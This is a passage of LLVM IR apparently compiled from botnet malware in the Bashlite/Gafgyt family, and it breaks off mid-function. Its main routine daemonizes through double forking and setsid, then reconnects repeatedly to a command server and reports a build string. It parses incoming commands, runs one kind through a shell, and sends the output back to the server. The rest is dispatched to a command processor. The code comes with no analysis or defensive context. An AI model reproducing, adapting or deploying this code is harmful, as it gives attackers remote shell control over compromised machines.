; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [4096 x i8], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca [1024 x i8], align 16
  %19 = alloca i32, align 4
  %20 = alloca [10 x i8*], align 16
  %21 = alloca i32, align 4
  %22 = alloca i8*, align 8
  %23 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = call i32 @getpid() #12
  %26 = xor i32 %24, %25
  call void @srand(i32 %26) #12
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = call i32 @getpid() #12
  %29 = xor i32 %27, %28
  call void @init_rand(i32 %29)
  %30 = call i32 @getOurIP()
  %31 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 1), align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 2), align 1
  %36 = zext i8 %35 to i32
  %37 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 3), align 1
  %38 = zext i8 %37 to i32
  %39 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 4), align 1
  %40 = zext i8 %39 to i32
  %41 = load i8, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 5), align 1
  %42 = zext i8 %41 to i32
  %43 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.76, i64 0, i64 0), i32 %32, i32 %34, i32 %36, i32 %38, i32 %40, i32 %42)
  %44 = call i32 @fork() #12
  store i32 %44, i32* %6, align 4
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %49

46:                                               ; preds = %2
  %47 = load i32, i32* %6, align 4
  %48 = call i32 @waitpid(i32 %47, i32* %8, i32 0)
  call void @exit(i32 0) #16
  unreachable

49:                                               ; preds = %2
  %50 = load i32, i32* %6, align 4
  %51 = icmp ne i32 %50, 0
  br i1 %51, label %64, label %52

52:                                               ; preds = %49
  %53 = call i32 @fork() #12
  store i32 %53, i32* %7, align 4
  %54 = icmp ne i32 %53, 0
  br i1 %54, label %55, label %56

55:                                               ; preds = %52
  call void @exit(i32 0) #16
  unreachable

56:                                               ; preds = %52
  %57 = load i32, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %56
  br label %62

60:                                               ; preds = %56
  %61 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i64 0, i64 0))
  br label %62

62:                                               ; preds = %60, %59
  br label %63

63:                                               ; preds = %62
  br label %66

64:                                               ; preds = %49
  %65 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i64 0, i64 0))
  br label %66

66:                                               ; preds = %64, %63
  br label %67

67:                                               ; preds = %66
  %68 = call i32 @setsid() #12
  %69 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.78, i64 0, i64 0)) #12
  %70 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #12
  br label %71

71:                                               ; preds = %67, %74, %368
  %72 = call i32 @initConnection()
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %77

74:                                               ; preds = %71
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.79, i64 0, i64 0))
  %76 = call i32 @sleep(i32 5)
  br label %71

77:                                               ; preds = %71
  %78 = load i32, i32* @mainCommSock, align 4
  %79 = call i8* @getBuild()
  %80 = call i32 (i32, i8*, ...) @sockprintf(i32 %78, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i64 0, i64 0), i8* %79)
  store i32 0, i32* %10, align 4
  store i32 0, i32* %11, align 4
  br label %81

81:                                               ; preds = %367, %286, %208, %170, %77
  %82 = load i32, i32* @mainCommSock, align 4
  %83 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %84 = call i32 @recvLine(i32 %82, i8* %83, i32 4096)
  store i32 %84, i32* %10, align 4
  %85 = icmp ne i32 %84, -1
  br i1 %85, label %86, label %368

86:                                               ; preds = %81
  store i32 0, i32* %11, align 4
  br label %87

87:                                               ; preds = %158, %86
  %88 = load i32, i32* %11, align 4
  %89 = sext i32 %88 to i64
  %90 = load i64, i64* @numpids, align 8
  %91 = icmp ult i64 %89, %90
  br i1 %91, label %92, label %161

92:                                               ; preds = %87
  %93 = load i32*, i32** @pids, align 8
  %94 = load i32, i32* %11, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds i32, i32* %93, i64 %95
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @waitpid(i32 %97, i32* null, i32 1)
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %100, label %157

100:                                              ; preds = %92
  %101 = load i32, i32* %11, align 4
  %102 = add nsw i32 %101, 1
  store i32 %102, i32* %13, align 4
  br label %103

103:                                              ; preds = %119, %100
  %104 = load i32, i32* %13, align 4
  %105 = zext i32 %104 to i64
  %106 = load i64, i64* @numpids, align 8
  %107 = icmp ult i64 %105, %106
  br i1 %107, label %108, label %122

108:                                              ; preds = %103
  %109 = load i32*, i32** @pids, align 8
  %110 = load i32, i32* %13, align 4
  %111 = zext i32 %110 to i64
  %112 = getelementptr inbounds i32, i32* %109, i64 %111
  %113 = load i32, i32* %112, align 4
  %114 = load i32*, i32** @pids, align 8
  %115 = load i32, i32* %13, align 4
  %116 = sub i32 %115, 1
  %117 = zext i32 %116 to i64
  %118 = getelementptr inbounds i32, i32* %114, i64 %117
  store i32 %113, i32* %118, align 4
  br label %119

119:                                              ; preds = %108
  %120 = load i32, i32* %13, align 4
  %121 = add i32 %120, 1
  store i32 %121, i32* %13, align 4
  br label %103, !llvm.loop !62

122:                                              ; preds = %103
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %13, align 4
  %125 = sub i32 %124, 1
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i32, i32* %123, i64 %126
  store i32 0, i32* %127, align 4
  %128 = load i64, i64* @numpids, align 8
  %129 = add i64 %128, -1
  store i64 %129, i64* @numpids, align 8
  %130 = load i64, i64* @numpids, align 8
  %131 = add i64 %130, 1
  %132 = mul i64 %131, 4
  %133 = call noalias align 16 i8* @malloc(i64 %132) #12
  %134 = bitcast i8* %133 to i32*
  store i32* %134, i32** %12, align 8
  store i32 0, i32* %13, align 4
  br label %135

135:                                              ; preds = %150, %122
  %136 = load i32, i32* %13, align 4
  %137 = zext i32 %136 to i64
  %138 = load i64, i64* @numpids, align 8
  %139 = icmp ult i64 %137, %138
  br i1 %139, label %140, label %153

140:                                              ; preds = %135
  %141 = load i32*, i32** @pids, align 8
  %142 = load i32, i32* %13, align 4
  %143 = zext i32 %142 to i64
  %144 = getelementptr inbounds i32, i32* %141, i64 %143
  %145 = load i32, i32* %144, align 4
  %146 = load i32*, i32** %12, align 8
  %147 = load i32, i32* %13, align 4
  %148 = zext i32 %147 to i64
  %149 = getelementptr inbounds i32, i32* %146, i64 %148
  store i32 %145, i32* %149, align 4
  br label %150

150:                                              ; preds = %140
  %151 = load i32, i32* %13, align 4
  %152 = add i32 %151, 1
  store i32 %152, i32* %13, align 4
  br label %135, !llvm.loop !63

153:                                              ; preds = %135
  %154 = load i32*, i32** @pids, align 8
  %155 = bitcast i32* %154 to i8*
  call void @free(i8* %155) #12
  %156 = load i32*, i32** %12, align 8
  store i32* %156, i32** @pids, align 8
  br label %157

157:                                              ; preds = %153, %92
  br label %158

158:                                              ; preds = %157
  %159 = load i32, i32* %11, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %11, align 4
  br label %87, !llvm.loop !64

161:                                              ; preds = %87
  %162 = load i32, i32* %10, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 %163
  store i8 0, i8* %164, align 1
  %165 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  call void @trim(i8* %165)
  %166 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %167 = call i8* @strstr(i8* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0)) #11
  %168 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %169 = icmp eq i8* %167, %168
  br i1 %169, label %170, label %173

170:                                              ; preds = %161
  %171 = load i32, i32* @mainCommSock, align 4
  %172 = call i32 (i32, i8*, ...) @sockprintf(i32 %171, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.81, i64 0, i64 0))
  br label %81, !llvm.loop !65

173:                                              ; preds = %161
  %174 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %175 = call i8* @strstr(i8* %174, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i64 0, i64 0)) #11
  %176 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  %177 = icmp eq i8* %175, %176
  br i1 %177, label %178, label %179

178:                                              ; preds = %173
  call void @exit(i32 0) #16
  unreachable

179:                                              ; preds = %173
  %180 = getelementptr inbounds [4096 x i8], [4096 x i8]* %9, i64 0, i64 0
  store i8* %180, i8** %14, align 8
  %181 = load i8*, i8** %14, align 8
  %182 = load i8, i8* %181, align 1
  %183 = zext i8 %182 to i32
  %184 = icmp eq i32 %183, 33
  br i1 %184, label %185, label %367

185:                                              ; preds = %179
  %186 = load i8*, i8** %14, align 8
  %187 = getelementptr inbounds i8, i8* %186, i64 1
  store i8* %187, i8** %15, align 8
  br label %188

188:                                              ; preds = %200, %185
  %189 = load i8*, i8** %15, align 8
  %190 = load i8, i8* %189, align 1
  %191 = zext i8 %190 to i32
  %192 = icmp ne i32 %191, 32
  br i1 %192, label %193, label %198

193:                                              ; preds = %188
  %194 = load i8*, i8** %15, align 8
  %195 = load i8, i8* %194, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp ne i32 %196, 0
  br label %198

198:                                              ; preds = %193, %188
  %199 = phi i1 [ false, %188 ], [ %197, %193 ]
  br i1 %199, label %200, label %203

200:                                              ; preds = %198
  %201 = load i8*, i8** %15, align 8
  %202 = getelementptr inbounds i8, i8* %201, i32 1
  store i8* %202, i8** %15, align 8
  br label %188, !llvm.loop !66

203:                                              ; preds = %198
  %204 = load i8*, i8** %15, align 8
  %205 = load i8, i8* %204, align 1
  %206 = zext i8 %205 to i32
  %207 = icmp eq i32 %206, 0
  br i1 %207, label %208, label %209

208:                                              ; preds = %203
  br label %81, !llvm.loop !65

209:                                              ; preds = %203
  %210 = load i8*, i8** %15, align 8
  store i8 0, i8* %210, align 1
  %211 = load i8*, i8** %14, align 8
  %212 = getelementptr inbounds i8, i8* %211, i64 1
  store i8* %212, i8** %15, align 8
  %213 = load i8*, i8** %14, align 8
  %214 = load i8*, i8** %15, align 8
  %215 = call i64 @strlen(i8* %214) #11
  %216 = getelementptr inbounds i8, i8* %213, i64 %215
  %217 = getelementptr inbounds i8, i8* %216, i64 2
  store i8* %217, i8** %14, align 8
  br label %218

218:                                              ; preds = %238, %209
  %219 = load i8*, i8** %14, align 8
  %220 = load i8*, i8** %14, align 8
  %221 = call i64 @strlen(i8* %220) #11
  %222 = sub i64 %221, 1
  %223 = getelementptr inbounds i8, i8* %219, i64 %222
  %224 = load i8, i8* %223, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 10
  br i1 %226, label %236, label %227

227:                                              ; preds = %218
  %228 = load i8*, i8** %14, align 8
  %229 = load i8*, i8** %14, align 8
  %230 = call i64 @strlen(i8* %229) #11
  %231 = sub i64 %230, 1
  %232 = getelementptr inbounds i8, i8* %228, i64 %231
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 13
  br label %236

236:                                              ; preds = %227, %218
  %237 = phi i1 [ true, %218 ], [ %235, %227 ]
  br i1 %237, label %238, label %244

238:                                              ; preds = %236
  %239 = load i8*, i8** %14, align 8
  %240 = load i8*, i8** %14, align 8
  %241 = call i64 @strlen(i8* %240) #11
  %242 = sub i64 %241, 1
  %243 = getelementptr inbounds i8, i8* %239, i64 %242
  store i8 0, i8* %243, align 1
  br label %218, !llvm.loop !67

244:                                              ; preds = %236
  %245 = load i8*, i8** %14, align 8
  store i8* %245, i8** %16, align 8
  br label %246

246:                                              ; preds = %258, %244
  %247 = load i8*, i8** %14, align 8
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp ne i32 %249, 32
  br i1 %250, label %251, label %256

251:                                              ; preds = %246
  %252 = load i8*, i8** %14, align 8
  %253 = load i8, i8* %252, align 1
  %254 = zext i8 %253 to i32
  %255 = icmp ne i32 %254, 0
  br label %256

256:                                              ; preds = %251, %246
  %257 = phi i1 [ false, %246 ], [ %255, %251 ]
  br i1 %257, label %258, label %261

258:                                              ; preds = %256
  %259 = load i8*, i8** %14, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 1
  store i8* %260, i8** %14, align 8
  br label %246, !llvm.loop !68

261:                                              ; preds = %256
  %262 = load i8*, i8** %14, align 8
  store i8 0, i8* %262, align 1
  %263 = load i8*, i8** %14, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %14, align 8
  %265 = load i8*, i8** %16, align 8
  store i8* %265, i8** %17, align 8
  br label %266

266:                                              ; preds = %270, %261
  %267 = load i8*, i8** %17, align 8
  %268 = load i8, i8* %267, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %279

270:                                              ; preds = %266
  %271 = load i8*, i8** %17, align 8
  %272 = load i8, i8* %271, align 1
  %273 = zext i8 %272 to i32
  %274 = call i32 @toupper(i32 %273) #11
  %275 = trunc i32 %274 to i8
  %276 = load i8*, i8** %17, align 8
  store i8 %275, i8* %276, align 1
  %277 = load i8*, i8** %17, align 8
  %278 = getelementptr inbounds i8, i8* %277, i32 1
  store i8* %278, i8** %17, align 8
  br label %266, !llvm.loop !69

279:                                              ; preds = %266
  %280 = load i8*, i8** %16, align 8
  %281 = call i32 @strcmp(i8* %280, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i64 0, i64 0)) #11
  %282 = icmp eq i32 %281, 0
  br i1 %282, label %283, label %309

283:                                              ; preds = %279
  %284 = call i32 @listFork()
  %285 = icmp ne i32 %284, 0
  br i1 %285, label %286, label %287

286:                                              ; preds = %283
  br label %81, !llvm.loop !65

287:                                              ; preds = %283
  %288 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %288, i8 0, i64 1024, i1 false)
  %289 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %290 = load i8*, i8** %14, align 8
  %291 = call i32 (i8*, i8*, ...) @szprintf(i8* %289, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.84, i64 0, i64 0), i8* %290)
  %292 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %293 = call i32 @fdpopen(i8* %292, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  store i32 %293, i32* %19, align 4
  br label %294

294:                                              ; preds = %299, %287
  %295 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %296 = load i32, i32* %19, align 4
  %297 = call i8* @fdgets(i8* %295, i32 1024, i32 %296)
  %298 = icmp ne i8* %297, null
  br i1 %298, label %299, label %306

299:                                              ; preds = %294
  %300 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  call void @trim(i8* %300)
  %301 = load i32, i32* @mainCommSock, align 4
  %302 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  %303 = call i32 (i32, i8*, ...) @sockprintf(i32 %301, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.85, i64 0, i64 0), i8* %302)
  %304 = getelementptr inbounds [1024 x i8], [1024 x i8]* %18, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %304, i8 0, i64 1024, i1 false)
  %305 = call i32 @sleep(i32 1)
  br label %294, !llvm.loop !70

306:                                              ; preds = %294
  %307 = load i32, i32* %19, align 4
  %308 = call i32 @fdpclose(i32 %307)
  call void @exit(i32 0) #16
  unreachable

309:                                              ; preds = %279
  store i32 1, i32* %21, align 4
  %310 = load i8*, i8** %14, align 8
  %311 = call i8* @strtok(i8* %310, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i64 0, i64 0)) #12
  store i8* %311, i8** %22, align 8
  %312 = load i8*, i8** %16, align 8
  %313 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 0
  store i8* %312, i8** %313, align 16
  br label %314

314:                                              ; preds = %345, %309
  %315 = load i8*, i8** %22, align 8
  %316 = icmp ne i8* %315, null
  br i1 %316, label %317, label %347

317:                                              ; preds = %314
  %318 = load i8*, i8** %22, align 8
  %319 = load i8, i8* %318, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp ne i32 %320, 10
  br i1 %321, label %322, label %345

322:                                              ; preds = %317
  %323 = load i8*, i8** %22, align 8
  %324 = call i64 @strlen(i8* %323) #11
  %325 = add i64 %324, 1
  %326 = call noalias align 16 i8* @malloc(i64 %325) #12
  %327 = load i32, i32* %21, align 4
  %328 = sext i32 %327 to i64
  %329 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %328
  store i8* %326, i8** %329, align 8
  %330 = load i32, i32* %21, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %331
  %333 = load i8*, i8** %332, align 8
  %334 = load i8*, i8** %22, align 8
  %335 = call i64 @strlen(i8* %334) #11
  %336 = add i64 %335, 1
  call void @llvm.memset.p0i8.i64(i8* align 1 %333, i8 0, i64 %336, i1 false)
  %337 = load i32, i32* %21, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %338
  %340 = load i8*, i8** %339, align 8
  %341 = load i8*, i8** %22, align 8
  %342 = call i8* @strcpy(i8* %340, i8* %341) #12
  %343 = load i32, i32* %21, align 4
  %344 = add nsw i32 %343, 1
  store i32 %344, i32* %21, align 4
  br label %345

345:                                              ; preds = %322, %317
  %346 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.86, i64 0, i64 0)) #12
  store i8* %346, i8** %22, align 8
  br label %314, !llvm.loop !71

347:                                              ; preds = %314
  %348 = load i32, i32* %21, align 4
  %349 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 0
  call void @processCmd(i32 %348, i8** %349)
  %350 = load i32, i32* %21, align 4
  %351 = icmp sgt i32 %350, 1
  br i1 %351, label %352, label %366

352:                                              ; preds = %347
  store i32 1, i32* %23, align 4
  store i32 1, i32* %23, align 4
  br label %353

353:                                              ; preds = %362, %352
  %354 = load i32, i32* %23, align 4
  %355 = load i32, i32* %21, align 4
  %356 = icmp slt i32 %354, %355
  br i1 %356, label %357, label %365

357:                                              ; preds = %353
  %358 = load i32, i32* %23, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds [10 x i8*], [10 x i8*]* %20, i64 0, i64 %359
  %361 = load i8*, i8** %360, align 8
  call void @free(i8* %361) #12
  br label %362

362:                                              ; preds = %357
  %363 = load i32, i32* %23, align 4
  %364 = add nsw i32 %363, 1
  store i32 %364, i32* %23, align 4
  br label %353, !llvm.loop !72

365:                                              ; preds = %353
  br label %366

366:                                              ; preds = %365, %347
  br label %367

367:                                              ; preds = %366, %179
  br label %81, !llvm.loop !65

368:                                              ; preds = %81
  %369 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.87, i64 0, i64 0))
  br label %71
}

; Function Attrs: nounwind
declare i32 @setsid() #3

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @printf(i8*, ...) #5

declare i32 @sleep(i32) #5

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @prints(i8** %0, i8* %1, i32 %2, i32 %3) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

15:                                               ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

17:                                               ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

21:                                               ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17, !llvm.loop !73

27:                                               ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

31:                                               ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

32:                                               ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

36:                                               ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

40:                                               ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

41:                                               ; preds = %40, %36
  br label %42

42:                                               ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

46:                                               ; preds = %42
  br label %47

47:                                               ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

50:                                               ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

55:                                               ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47, !llvm.loop !74

58:                                               ; preds = %47
  br label %59

59:                                               ; preds = %58, %42
  br label %60

60:                                               ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

64:                                               ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

71:                                               ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60, !llvm.loop !75

74:                                               ; preds = %60
  br label %75

75:                                               ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

78:                                               ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

83:                                               ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75, !llvm.loop !76

86:                                               ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @printi(i8** %0, i32 %1, i32 %2, i32 %3, i32 %4, i32 %5, i32 %6) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

25:                                               ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

33:                                               ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

36:                                               ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

39:                                               ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

42:                                               ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

45:                                               ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

50:                                               ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

53:                                               ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

59:                                               ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

65:                                               ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50, !llvm.loop !77

74:                                               ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

77:                                               ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

80:                                               ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
